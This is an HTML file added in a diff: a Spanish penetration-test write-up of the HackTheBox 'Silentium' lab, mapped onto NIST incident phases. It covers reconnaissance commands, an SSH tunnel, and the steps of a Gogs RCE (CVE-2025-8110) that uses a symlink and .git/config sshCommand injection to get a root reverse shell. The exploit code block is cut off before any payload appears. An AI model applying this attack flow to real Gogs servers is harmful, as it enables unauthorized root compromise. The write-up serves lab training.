@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>INC-2025-HTB-SILENTIUM | Informe Ejecutivo</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/vue/3.4.21/vue.global.prod.min.js"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Overpass+Mono:wght@300;400;600;700&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;1,9..40,300&display=swap" rel="stylesheet"/>
+<style>
+/* ─────────────────── TOKENS ─────────────────── */
+:root{
+  --bg:        #05070a;
+  --surface:   #0a0e14;
+  --card:      #0f1520;
+  --card2:     #131b26;
+  --border:    #1c2a3a;
+  --border2:   #253649;
+  --red:       #e8334a;
+  --red-dim:   rgba(232,51,74,.12);
+  --orange:    #f97316;
+  --orange-dim:rgba(249,115,22,.1);
+  --yellow:    #eab308;
+  --yellow-dim:rgba(234,179,8,.08);
+  --green:     #22c55e;
+  --green-dim: rgba(34,197,94,.1);
+  --blue:      #38bdf8;
+  --blue-dim:  rgba(56,189,248,.08);
+  --text:      #c8d8e8;
+  --muted:     #5a7a96;
+  --faint:     #2a3f52;
+  --white:     #f0f6fc;
+  --code-bg:   #040608;
+  --font-h:    'Bebas Neue', sans-serif;
+  --font-mono: 'Overpass Mono', monospace;
+  --font-body: 'DM Sans', sans-serif;
+}
+
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+
+body{
+  background:var(--bg);
+  font-family:var(--font-body);
+  font-size:14px;
+  line-height:1.75;
+  color:var(--text);
+  min-height:100vh;
+  overflow-x:hidden;
+}
+
+/* noise texture overlay */
+body::before{
+  content:'';
+  position:fixed;inset:0;pointer-events:none;z-index:0;
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+  opacity:.4;
+}
+
+/* faint vertical lines */
+body::after{
+  content:'';
+  position:fixed;inset:0;pointer-events:none;z-index:0;
+  background:repeating-linear-gradient(90deg,
+    transparent 0,transparent 79px,
+    rgba(56,189,248,.018) 79px,rgba(56,189,248,.018) 80px);
+}
+
+#app{position:relative;z-index:1}
+
+/* ─────────────────── LAYOUT ─────────────────── */
+.page{max-width:960px;margin:0 auto;padding:0 28px 100px}
+
+/* ─────────────────── TOPBAR ─────────────────── */
+.topbar{
+  position:sticky;top:0;z-index:100;
+  height:44px;
+  background:rgba(5,7,10,.88);
+  backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 28px;
+  font-family:var(--font-mono);font-size:10.5px;color:var(--muted);
+}
+.topbar-id{color:var(--blue);letter-spacing:.06em}
+.topbar-right{display:flex;align-items:center;gap:14px}
+.sev-pill{
+  font-family:var(--font-mono);font-size:9.5px;font-weight:700;
+  letter-spacing:.1em;padding:2px 9px;border-radius:3px;
+  border:1px solid var(--red);color:var(--red);
+  background:var(--red-dim);
+}
+.status-dot{
+  width:7px;height:7px;border-radius:50%;
+  background:var(--green);
+  box-shadow:0 0 6px var(--green);
+  animation:blink 2.4s ease-in-out infinite;
+}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+
+/* ─────────────────── HERO ─────────────────── */
+.hero{
+  padding:72px 0 52px;
+  border-bottom:1px solid var(--border);
+  position:relative;overflow:hidden;
+}
+/* big bg text */
+.hero-ghost{
+  position:absolute;right:-20px;top:30px;
+  font-family:var(--font-h);font-size:clamp(90px,16vw,160px);
+  color:rgba(232,51,74,.04);line-height:1;
+  pointer-events:none;user-select:none;letter-spacing:.04em;
+}
+.hero-eyebrow{
+  display:inline-flex;align-items:center;gap:10px;
+  font-family:var(--font-mono);font-size:10px;letter-spacing:.14em;
+  text-transform:uppercase;color:var(--red);margin-bottom:18px;
+}
+.hero-eyebrow::before{
+  content:'';display:block;width:24px;height:1px;background:var(--red);
+}
+.hero-title{
+  font-family:var(--font-h);
+  font-size:clamp(38px,7vw,72px);
+  letter-spacing:.04em;line-height:.96;
+  color:var(--white);margin-bottom:10px;
+}
+.hero-title .accent{color:var(--red)}
+.hero-subtitle{
+  font-family:var(--font-mono);font-size:11.5px;
+  color:var(--muted);margin-bottom:36px;letter-spacing:.04em;
+}
+
+.hero-meta{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(150px,1fr));
+  gap:1px;background:var(--border);
+  border:1px solid var(--border);border-radius:6px;overflow:hidden;
+  max-width:720px;
+}
+.meta-cell{background:var(--card);padding:13px 16px}
+.meta-lbl{font-family:var(--font-mono);font-size:8.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);margin-bottom:4px}
+.meta-val{font-family:var(--font-mono);font-size:11.5px;color:var(--text);font-weight:600}
+.meta-val.red{color:var(--red)}
+.meta-val.orange{color:var(--orange)}
+.meta-val.green{color:var(--green)}
+
+/* ─────────────────── SECTIONS ─────────────────── */
+.section{margin:52px 0}
+
+.sec-header{
+  display:flex;align-items:flex-start;gap:16px;
+  margin-bottom:28px;
+}
+.sec-num{
+  font-family:var(--font-h);font-size:48px;line-height:1;
+  color:rgba(232,51,74,.18);letter-spacing:.04em;
+  flex-shrink:0;margin-top:-4px;min-width:44px;
+}
+.sec-info{flex:1;border-bottom:1px solid var(--border);padding-bottom:12px}
+.sec-tag{
+  font-family:var(--font-mono);font-size:9px;letter-spacing:.14em;
+  text-transform:uppercase;color:var(--red);margin-bottom:4px;
+}
+.sec-title{
+  font-family:var(--font-h);font-size:26px;letter-spacing:.04em;
+  color:var(--white);line-height:1.1;
+}
+.sec-desc{font-size:13px;color:var(--muted);margin-top:4px}
+
+p{color:var(--text);margin-bottom:14px;font-size:14px}
+p strong{color:var(--white)}
+p em{color:var(--muted);font-style:italic}
+
+/* ─────────────────── CALLOUTS ─────────────────── */
+.callout{
+  border-left:3px solid;border-radius:0 6px 6px 0;
+  padding:14px 18px;margin:18px 0;font-size:13.5px;
+}
+.callout-red   {border-color:var(--red);   background:var(--red-dim)}
+.callout-orange{border-color:var(--orange);background:var(--orange-dim)}
+.callout-yellow{border-color:var(--yellow);background:var(--yellow-dim)}
+.callout-green {border-color:var(--green); background:var(--green-dim)}
+.callout-blue  {border-color:var(--blue);  background:var(--blue-dim)}
+
+/* ─────────────────── ATTACK CHAIN ─────────────────── */
+.chain{display:flex;flex-direction:column;gap:0;position:relative}
+.chain::before{
+  content:'';
+  position:absolute;left:22px;top:40px;bottom:40px;
+  width:1px;background:linear-gradient(180deg,var(--red),var(--orange),var(--red));
+  opacity:.3;
+}
+.chain-step{
+  display:grid;grid-template-columns:48px 1fr;
+  gap:0;position:relative;
+  margin-bottom:4px;
+}
+.chain-node{
+  display:flex;align-items:flex-start;justify-content:center;
+  padding-top:18px;
+}
+.chain-circle{
+  width:24px;height:24px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-family:var(--font-mono);font-size:9px;font-weight:700;
+  border:1px solid;flex-shrink:0;position:relative;z-index:1;
+  background:var(--bg);
+}
+.chain-circle.recon  {border-color:var(--blue);  color:var(--blue)}
+.chain-circle.access {border-color:var(--yellow);color:var(--yellow)}
+.chain-circle.enum   {border-color:var(--orange);color:var(--orange)}
+.chain-circle.exploit{border-color:var(--red);   color:var(--red)}
+.chain-circle.post   {border-color:var(--green); color:var(--green)}
+.chain-body{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:8px;margin:8px 0 8px 12px;
+  padding:16px 20px;
+  transition:border-color .2s;
+}
+.chain-body:hover{border-color:var(--border2)}
+.chain-phase{
+  font-family:var(--font-mono);font-size:9px;letter-spacing:.12em;
+  text-transform:uppercase;margin-bottom:4px;
+}
+.chain-phase.recon  {color:var(--blue)}
+.chain-phase.access {color:var(--yellow)}
+.chain-phase.enum   {color:var(--orange)}
+.chain-phase.exploit{color:var(--red)}
+.chain-phase.post   {color:var(--green)}
+.chain-title{
+  font-family:var(--font-body);font-size:14px;font-weight:600;
+  color:var(--white);margin-bottom:7px;
+}
+.chain-desc{font-size:13px;color:var(--text);line-height:1.6}
+
+/* ─────────────────── CODE BLOCKS ─────────────────── */
+.code-wrap{background:var(--code-bg);border:1px solid var(--border);border-radius:7px;overflow:hidden;margin:12px 0}
+.code-bar{
+  background:var(--card);border-bottom:1px solid var(--border);
+  padding:8px 14px;display:flex;align-items:center;gap:7px;
+}
+.code-dot{width:9px;height:9px;border-radius:50%}
+.code-filename{font-family:var(--font-mono);font-size:10px;color:var(--muted);margin-left:auto}
+pre{
+  padding:18px 20px;overflow-x:auto;
+  font-family:var(--font-mono);font-size:12px;
+  line-height:1.8;color:var(--text);
+}
+.t-green{color:var(--green)}
+.t-red  {color:var(--red)}
+.t-blue {color:var(--blue)}
+.t-yellow{color:var(--yellow)}
+.t-orange{color:var(--orange)}
+.t-muted{color:var(--muted)}
+.t-white{color:var(--white);font-weight:600}
+
+/* ─────────────────── TABLES ─────────────────── */
+.tbl-wrap{overflow-x:auto;border-radius:7px;border:1px solid var(--border);margin:14px 0}
+table{width:100%;border-collapse:collapse}
+thead tr{background:rgba(232,51,74,.06)}
+thead th{
+  font-family:var(--font-mono);font-size:9.5px;letter-spacing:.1em;
+  text-transform:uppercase;color:var(--red);
+  padding:10px 14px;text-align:left;
+  border-bottom:1px solid var(--border);
+}
+tbody tr{border-bottom:1px solid var(--border);transition:background .15s}
+tbody tr:last-child{border-bottom:none}
+tbody tr:hover{background:rgba(232,51,74,.03)}
+tbody tr:nth-child(even){background:rgba(0,0,0,.2)}
+td{
+  padding:9px 14px;font-size:13px;
+  color:var(--text);vertical-align:middle;
+}
+td.mono{font-family:var(--font-mono);font-size:11px}
+td.hl  {color:var(--white);font-weight:500}
+
+/* ─────────────────── BADGES ─────────────────── */
+.badge{
+  display:inline-block;padding:2px 8px;border-radius:3px;
+  font-family:var(--font-mono);font-size:10px;font-weight:700;
+  letter-spacing:.05em;border:1px solid;
+}
+.b-red   {background:var(--red-dim);   color:var(--red);   border-color:rgba(232,51,74,.35)}
+.b-orange{background:var(--orange-dim);color:var(--orange);border-color:rgba(249,115,22,.3)}
+.b-yellow{background:var(--yellow-dim);color:var(--yellow);border-color:rgba(234,179,8,.3)}
+.b-green {background:var(--green-dim); color:var(--green); border-color:rgba(34,197,94,.3)}
+.b-blue  {background:var(--blue-dim);  color:var(--blue);  border-color:rgba(56,189,248,.25)}
+.b-dim   {background:rgba(26,42,58,.4);color:var(--muted); border-color:var(--border)}
+
+/* ─────────────────── CVE CARD ─────────────────── */
+.cve-card{
+  background:var(--card);border:1px solid rgba(232,51,74,.3);
+  border-radius:10px;padding:24px 26px;margin:18px 0;
+  position:relative;overflow:hidden;
+}
+.cve-card::before{
+  content:'';
+  position:absolute;top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,var(--red),var(--orange));
+}
+.cve-num{
+  font-family:var(--font-h);font-size:32px;letter-spacing:.06em;
+  color:var(--red);line-height:1;margin-bottom:8px;
+}
+.cve-title{font-size:15px;font-weight:600;color:var(--white);margin-bottom:10px}
+.cve-meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px}
+.cve-body{font-size:13.5px;color:var(--text)}
+
+/* ─────────────────── EXPLOIT FLOW ─────────────────── */
+.exploit-steps{display:flex;flex-direction:column;gap:3px;margin:16px 0}
+.exp-step{
+  display:grid;grid-template-columns:36px 1fr;
+  background:var(--card2);border:1px solid var(--border);
+  border-radius:6px;overflow:hidden;
+  transition:border-color .2s;
+}
+.exp-step:hover{border-color:var(--border2)}
+.exp-idx{
+  background:rgba(232,51,74,.08);
+  display:flex;align-items:center;justify-content:center;
+  font-family:var(--font-mono);font-size:11px;font-weight:700;
+  color:var(--red);border-right:1px solid var(--border);
+}
+.exp-content{padding:12px 16px}
+.exp-label{
+  font-family:var(--font-mono);font-size:10px;letter-spacing:.08em;
+  color:var(--muted);margin-bottom:3px;
+}
+.exp-text{font-size:13px;color:var(--text)}
+
+/* ─────────────────── TIMELINE ─────────────────── */
+.timeline{margin:16px 0}
+.tl-item{
+  display:grid;grid-template-columns:120px 1fr;
+  gap:0;margin-bottom:4px;
+}
+.tl-time{
+  font-family:var(--font-mono);font-size:11px;color:var(--muted);
+  padding:12px 16px 12px 0;text-align:right;
+  border-right:1px solid var(--border);
+  margin-right:0;
+}
+.tl-dot{
+  width:8px;height:8px;border-radius:50%;
+  background:var(--red);margin-top:16px;margin-left:-4px;
+  margin-right:12px;flex-shrink:0;
+  box-shadow:0 0 8px rgba(232,51,74,.5);
+}
+.tl-body{
+  display:flex;align-items:flex-start;
+  padding:10px 0 10px 16px;
+}
+.tl-content{}
+.tl-event{font-size:13.5px;color:var(--white);font-weight:500}
+.tl-detail{font-size:12px;color:var(--muted);margin-top:2px}
+
+/* ─────────────────── FINDINGS ─────────────────── */
+.findings-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
+  gap:10px;margin:16px 0;
+}
+.finding-card{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:8px;padding:18px 20px;
+  transition:border-color .2s,transform .15s;
+  position:relative;overflow:hidden;
+}
+.finding-card:hover{border-color:var(--border2);transform:translateY(-2px)}
+.finding-card::after{
+  content:'';position:absolute;
+  bottom:0;left:0;right:0;height:2px;
+}
+.finding-card.crit::after{background:var(--red)}
+.finding-card.high::after{background:var(--orange)}
+.finding-card.med ::after{background:var(--yellow)}
+.finding-sev{
+  font-family:var(--font-mono);font-size:9px;letter-spacing:.12em;
+  text-transform:uppercase;margin-bottom:8px;
+}
+.finding-sev.crit{color:var(--red)}
+.finding-sev.high{color:var(--orange)}
+.finding-sev.med {color:var(--yellow)}
+.finding-title{
+  font-size:14px;font-weight:600;color:var(--white);margin-bottom:8px;
+}
+.finding-desc{font-size:12.5px;color:var(--muted);line-height:1.6}
+
+/* ─────────────────── RECS ─────────────────── */
+.rec-list{display:flex;flex-direction:column;gap:6px;margin:16px 0}
+.rec-item{
+  display:grid;grid-template-columns:44px 1fr;
+  background:var(--card);border:1px solid var(--border);
+  border-radius:7px;overflow:hidden;
+  transition:border-color .2s;
+}
+.rec-item:hover{border-color:var(--border2)}
+.rec-prio{
+  display:flex;align-items:center;justify-content:center;
+  font-family:var(--font-mono);font-size:10px;font-weight:700;
+  border-right:1px solid var(--border);
+  writing-mode:vertical-rl;text-orientation:mixed;
+  letter-spacing:.1em;
+}
+.rec-prio.p1{color:var(--red);  background:rgba(232,51,74,.06)}
+.rec-prio.p2{color:var(--orange);background:rgba(249,115,22,.05)}
+.rec-prio.p3{color:var(--yellow);background:rgba(234,179,8,.04)}
+.rec-body{padding:14px 18px}
+.rec-title{font-size:14px;font-weight:600;color:var(--white);margin-bottom:5px}
+.rec-desc{font-size:13px;color:var(--muted);line-height:1.6}
+
+/* ─────────────────── FLAG BOX ─────────────────── */
+.flag-box{
+  background:linear-gradient(135deg,rgba(34,197,94,.07),rgba(56,189,248,.04));
+  border:1px solid rgba(34,197,94,.28);border-radius:10px;
+  padding:28px 30px;margin:20px 0;position:relative;overflow:hidden;
+}
+.flag-box::before{
+  content:'ROOT COMPROMISE CONFIRMED';
+  position:absolute;top:12px;right:16px;
+  font-family:var(--font-mono);font-size:8.5px;letter-spacing:.14em;
+  color:rgba(34,197,94,.35);
+}
+.flag-lbl{
+  font-family:var(--font-mono);font-size:9.5px;letter-spacing:.12em;
+  text-transform:uppercase;color:var(--muted);margin-bottom:10px;
+}
+.flag-val{
+  font-family:var(--font-mono);font-size:20px;font-weight:700;
+  color:var(--green);letter-spacing:.06em;
+  text-shadow:0 0 24px rgba(34,197,94,.4);
+}
+
+/* ─────────────────── SIGNATURE ─────────────────── */
+.sig-grid{
+  display:grid;grid-template-columns:repeat(3,1fr);
+  gap:1px;background:var(--border);
+  border:1px solid var(--border);border-radius:7px;overflow:hidden;
+  margin-top:28px;
+}
+@media(max-width:540px){.sig-grid{grid-template-columns:1fr}}
+.sig-cell{background:var(--card);padding:16px 18px}
+.sig-lbl{font-family:var(--font-mono);font-size:8.5px;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);margin-bottom:5px}
+.sig-name{font-family:var(--font-body);font-size:14px;font-weight:600;color:var(--white)}
+.sig-role{font-family:var(--font-mono);font-size:10px;color:var(--muted);margin-top:2px}
+
+/* ─────────────────── FOOTER ─────────────────── */
+.footer{
+  border-top:1px solid var(--border);padding:18px 28px;
+  font-family:var(--font-mono);font-size:10px;color:var(--muted);
+  display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px;
+}
+
+/* ─────────────────── ANIMATIONS ─────────────────── */
+.reveal{opacity:0;transform:translateY(20px);transition:opacity .55s ease,transform .55s ease}
+.reveal.in{opacity:1;transform:none}
+
+/* ─────────────────── SCROLLBAR ─────────────────── */
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+</style>
+</head>
+<body>
+<div id="app">
+
+  <!-- TOP BAR -->
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <div class="status-dot"></div>
+      <span class="topbar-id">INC-2025-HTB-SILENTIUM</span>
+      <span style="color:var(--faint)">·</span>
+      <span>Informe Ejecutivo de Seguridad</span>
+    </div>
+    <div class="topbar-right">
+      <span style="color:var(--muted)">NIST SP 800-61 Rev.2</span>
+      <span class="sev-pill">CRÍTICO</span>
+    </div>
+  </div>
+
+  <div class="page">
+
+    <!-- ── HERO ── -->
+    <div class="hero reveal">
+      <div class="hero-ghost">SILENTIUM</div>
+      <div class="hero-eyebrow">Penetration Test Report</div>
+      <h1 class="hero-title">HTB<br/><span class="accent">SILENTIUM</span></h1>
+      <p class="hero-subtitle">Compromiso completo de servidor Linux vía CVE-2025-8110 (Gogs RCE) · Escalada a root</p>
+      <div class="hero-meta">
+        <div class="meta-cell">
+          <div class="meta-lbl">Referencia</div>
+          <div class="meta-val">INC-2025-HTB-SILENTIUM</div>
+        </div>
+        <div class="meta-cell">
+          <div class="meta-lbl">Severidad</div>
+          <div class="meta-val red">CRÍTICA</div>
+        </div>
+        <div class="meta-cell">
+          <div class="meta-lbl">Resultado</div>
+          <div class="meta-val red">Root Comprometido</div>
+        </div>
+        <div class="meta-cell">
+          <div class="meta-lbl">CVE principal</div>
+          <div class="meta-val orange">CVE-2025-8110</div>
+        </div>
+        <div class="meta-cell">
+          <div class="meta-lbl">Analista</div>
+          <div class="meta-val">Bryan Reyes Campos</div>
+        </div>
+        <div class="meta-cell">
+          <div class="meta-lbl">Marco</div>
+          <div class="meta-val">NIST SP 800-61 Rev.2</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── SECTION 1: RESUMEN EJECUTIVO ── -->
+    <div class="section reveal">
+      <div class="sec-header">
+        <div class="sec-num">01</div>
+        <div class="sec-info">
+          <div class="sec-tag">NIST Phase 1 — Preparación / Alcance</div>
+          <div class="sec-title">Resumen Ejecutivo</div>
+          <div class="sec-desc">Visión de alto nivel del incidente y su impacto</div>
+        </div>
+      </div>
+
+      <p>Se realizó un ejercicio de prueba de penetración contra el objetivo <strong>Silentium</strong> (plataforma HackTheBox), identificado bajo dirección IP de laboratorio. El objetivo era obtener acceso privilegiado completo al sistema.</p>
+
+      <p>Durante la evaluación se identificó y explotó exitosamente <strong>CVE-2025-8110</strong>, una vulnerabilidad crítica en <strong>Gogs</strong> (servicio de control de versiones) que permite la ejecución remota de comandos como usuario <strong>root</strong> mediante el abuso del mecanismo de symlinks en combinación con la sobrescritura del archivo <code>.git/config</code> y la inyección de un <code>sshCommand</code> malicioso.</p>
+
+      <div class="callout callout-red">
+        <strong>🔴 Compromiso total:</strong> El atacante obtuvo una shell interactiva con privilegios de <code>root</code>, acceso irrestricto al sistema de archivos y capacidad de movimiento lateral. Los flags del sistema fueron recuperados con éxito.
+      </div>
+
+      <p>La cadena de ataque inició desde un acceso de bajo privilegio legítimo (usuario <em>ben</em>) y escaló a root en un solo paso de explotación, sin requerir técnicas complejas de post-explotación adicionales.</p>
+    </div>
+
+    <!-- ── SECTION 2: DETECCIÓN Y ANÁLISIS ── -->
+    <div class="section reveal">
+      <div class="sec-header">
+        <div class="sec-num">02</div>
+        <div class="sec-info">
+          <div class="sec-tag">NIST Phase 2 — Detección y Análisis</div>
+          <div class="sec-title">Reconocimiento y Análisis de Superficie</div>
+          <div class="sec-desc">Identificación de activos, servicios y vectores de ataque</div>
+        </div>
+      </div>
+
+      <p>El reconocimiento inicial reveló una superficie de ataque pequeña pero con servicios internos críticos expuestos únicamente en loopback, lo que sugiere una arquitectura de microservicios sin segmentación de red interna.</p>
+
+      <div class="subsection" style="margin-bottom:12px">
+        <span style="font-family:var(--font-mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--blue)">Puertos y servicios externos</span>
+      </div>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Puerto</th><th>Protocolo</th><th>Servicio</th><th>Versión / Banner</th><th>Estado</th></tr></thead>
+          <tbody>
+            <tr>
+              <td class="mono">22/tcp</td><td class="mono">SSH</td>
+              <td class="hl">OpenSSH</td><td class="mono">—</td>
+              <td><span class="badge b-orange">Acceso inicial</span></td>
+            </tr>
+            <tr>
+              <td class="mono">80/tcp</td><td class="mono">HTTP</td>
+              <td class="hl">nginx</td><td class="mono">silentium.htb</td>
+              <td><span class="badge b-dim">Reconocimiento</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div style="margin:20px 0 12px;font-family:var(--font-mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--orange)">Servicios internos (loopback)</div>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Bind</th><th>Puerto</th><th>Servicio</th><th>Observación</th></tr></thead>
+          <tbody>
+            <tr>
+              <td class="mono">127.0.0.1</td><td class="mono">3000</td>
+              <td class="hl">Flowise</td>
+              <td>Plataforma AI/LLM — endpoint <code>/api/v1/node-load-method/customMCP</code> requería Bearer token válido. Devolvió <span class="badge b-dim">401</span> — descartado como vector.</td>
+            </tr>
+            <tr>
+              <td class="mono">127.0.0.1</td><td class="mono">3001</td>
+              <td class="hl">Gogs</td>
+              <td>Servicio Git autoalojado — <span class="badge b-red">CVE-2025-8110</span> confirmado como vector de explotación.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="code-wrap" style="margin-top:16px">
+        <div class="code-bar">
+          <div class="code-dot" style="background:#ff5f56"></div>
+          <div class="code-dot" style="background:#ffbd2e"></div>
+          <div class="code-dot" style="background:#27c93f"></div>
+          <div class="code-filename">bash · reconocimiento inicial</div>
+        </div>
+        <pre><span class="t-muted"># Escaneo completo de puertos</span>
+<span class="t-blue">nmap</span> -p- -n -Pn -sS --min-rate 5000 --open -vvv -oG ports &lt;TARGET_IP&gt;
+
+<span class="t-muted"># Detección de servicios y versiones</span>
+<span class="t-blue">nmap</span> -p22,80 -sCV -oN services &lt;TARGET_IP&gt;
+
+<span class="t-muted"># Enumeración de servicios internos (post-acceso)</span>
+<span class="t-blue">ss</span> -ltnp | grep -E <span class="t-yellow">':3000|:3001'</span>
+<span class="t-muted"># → 127.0.0.1:3000  Flowise</span>
+<span class="t-muted"># → 127.0.0.1:3001  Gogs ← vector de explotación</span></pre>
+      </div>
+    </div>
+
+    <!-- ── SECTION 3: CONTENCIÓN ── -->
+    <div class="section reveal">
+      <div class="sec-header">
+        <div class="sec-num">03</div>
+        <div class="sec-info">
+          <div class="sec-tag">NIST Phase 3 — Contención</div>
+          <div class="sec-title">Cadena de Ataque</div>
+          <div class="sec-desc">Secuencia completa desde foothold hasta root</div>
+        </div>
+      </div>
+
+      <div class="chain">
+        <div class="chain-step">
+          <div class="chain-node">
+            <div class="chain-circle recon">01</div>
+          </div>
+          <div class="chain-body">
+            <div class="chain-phase recon">Reconocimiento externo</div>
+            <div class="chain-title">Identificación de puertos y virtual host</div>
+            <div class="chain-desc">Nmap revela puertos 22 (SSH) y 80 (nginx → <code>silentium.htb</code>). Superficie mínima expuesta al exterior.</div>
+          </div>
+        </div>
+
+        <div class="chain-step">
+          <div class="chain-node">
+            <div class="chain-circle access">02</div>
+          </div>
+          <div class="chain-body">
+            <div class="chain-phase access">Acceso inicial · Foothold</div>
+            <div class="chain-title">Login SSH con credenciales de bajo privilegio</div>
+            <div class="chain-desc">Acceso como usuario <strong style="color:var(--yellow)">ben</strong> mediante credenciales conocidas (low-priv). Sin escalada local directa disponible.</div>
+          </div>
+        </div>
+
+        <div class="chain-step">
+          <div class="chain-node">
+            <div class="chain-circle enum">03</div>
+          </div>
+          <div class="chain-body">
+            <div class="chain-phase enum">Enumeración interna</div>
+            <div class="chain-title">Descubrimiento de servicios en loopback</div>
+            <div class="chain-desc"><code>ss -ltnp</code> revela Flowise en <code>:3000</code> y Gogs en <code>:3001</code>. Ambos corriendo como <strong>root</strong>. Flowise descartado por <code>401 Unauthorized</code>. Gogs seleccionado como objetivo.</div>
+          </div>
+        </div>
+
+        <div class="chain-step">
+          <div class="chain-node">
+            <div class="chain-circle exploit">04</div>
+          </div>
+          <div class="chain-body">
+            <div class="chain-phase exploit">Explotación · CVE-2025-8110</div>
+            <div class="chain-title">Gogs RCE via Symlink + sshCommand injection</div>
+            <div class="chain-desc">SSH port-forwarding hacia Gogs. Ejecución del PoC: crea repo, sube symlink <code>malicious_link → .git/config</code>, sobrescribe config con <code>sshCommand</code> malicioso. Listener nc recibe shell.</div>
+          </div>
+        </div>
+
+        <div class="chain-step">
+          <div class="chain-node">
+            <div class="chain-circle post">05</div>
+          </div>
+          <div class="chain-body">
+            <div class="chain-phase post">Post-explotación · Root</div>
+            <div class="chain-title">Shell interactiva como root · Flag recuperado</div>
+            <div class="chain-desc">Shell recibida con <code>uid=0(root)</code>. Acceso total al sistema. Flag leído desde <code>/root/root.txt</code>.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="flag-box" style="margin-top:24px">
+        <div class="flag-lbl">// ROOT FLAG · /root/root.txt</div>
+        <div class="flag-val">flag$$$$$$$$$$$$$$$$$$</div>
+      </div>
+    </div>
+
+    <!-- ── SECTION 4: ERRADICACIÓN ── -->
+    <div class="section reveal">
+      <div class="sec-header">
+        <div class="sec-num">04</div>
+        <div class="sec-info">
+          <div class="sec-tag">NIST Phase 4 — Erradicación</div>
+          <div class="sec-title">CVE-2025-8110 — Análisis Técnico</div>
+          <div class="sec-desc">Detalle de la vulnerabilidad explotada y mecánica del ataque</div>
+        </div>
+      </div>
+
+      <div class="cve-card">
+        <div class="cve-num">CVE-2025-8110</div>
+        <div class="cve-title">Gogs — Remote Code Execution via Symlink + .git/config sshCommand Injection</div>
+        <div class="cve-meta">
+          <span class="badge b-red">CRÍTICO</span>
+          <span class="badge b-orange">RCE</span>
+          <span class="badge b-blue">Gogs &lt; patch</span>
+          <span class="badge b-dim">API PutContents</span>
+          <span class="badge b-dim">Pre-auth (cuenta requerida)</span>
+        </div>
+        <div class="cve-body">
+          <p>La vulnerabilidad permite a un usuario autenticado de Gogs lograr ejecución de código remoto con los privilegios del proceso Gogs (root en este caso) mediante la manipulación del flujo de trabajo de repositorios Git.</p>
+          <p><strong>Vector técnico:</strong> La API <code>PutContents</code> permite subir un symlink que apunta a <code>.git/config</code>. Al sobrescribir ese archivo con una entrada <code>sshCommand</code> maliciosa, se inyecta un comando que se ejecuta cuando el servidor clona el repositorio vía SSH.</p>
+        </div>
+      </div>
+
+      <div style="margin:20px 0 12px;font-family:var(--font-mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--red)">Flujo de explotación — 4 pasos</div>
+      <div class="exploit-steps">
+        <div class="exp-step">
+          <div class="exp-idx">1</div>
+          <div class="exp-content">
+            <div class="exp-label">Preparación</div>
+            <div class="exp-text">Crear cuenta en Gogs (acceso web) y generar API token. Levantar tunnel SSH: <code>ssh -N -L 13001:localhost:3001 ben@&lt;TARGET&gt;</code></div>
+          </div>
+        </div>
+        <div class="exp-step">
+          <div class="exp-idx">2</div>
+          <div class="exp-content">
+            <div class="exp-label">Staging del payload</div>
+            <div class="exp-text">El PoC crea un repositorio vía API, sube un symlink <code>malicious_link → .git/config</code> y sobrescribe el config con una entrada <code>sshCommand</code> que apunta al listener del atacante.</div>
+          </div>
+        </div>
+        <div class="exp-step">
+          <div class="exp-idx">3</div>
+          <div class="exp-content">
+            <div class="exp-label">Trigger</div>
+            <div class="exp-text">Al clonar el repositorio por SSH, Gogs ejecuta el <code>sshCommand</code> inyectado con los privilegios del proceso (<code>root</code>), disparando la reverse shell.</div>
+          </div>
+        </div>
+        <div class="exp-step">
+          <div class="exp-idx">4</div>
+          <div class="exp-content">
+            <div class="exp-label">Recepción de shell</div>
+            <div class="exp-text">Netcat listener en el atacante recibe conexión entrante con <code>uid=0(root) gid=0(root)</code>. Compromiso total confirmado.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="code-wrap" style="margin-top:18px">
+        <div class="code-bar">
+          <div class="code-dot" style="background:#ff5f56"></div>
+          <div class="code-dot" style="background:#ffbd2e"></div>
+          <div class="code-dot" style="background:#27c93f"></div>
+          <div class="code-filename">bash · ejecución del exploit</div>
+        </div>
+        <pre><span class="t-muted"># 1. Tunnel SSH hacia Gogs interno</span>
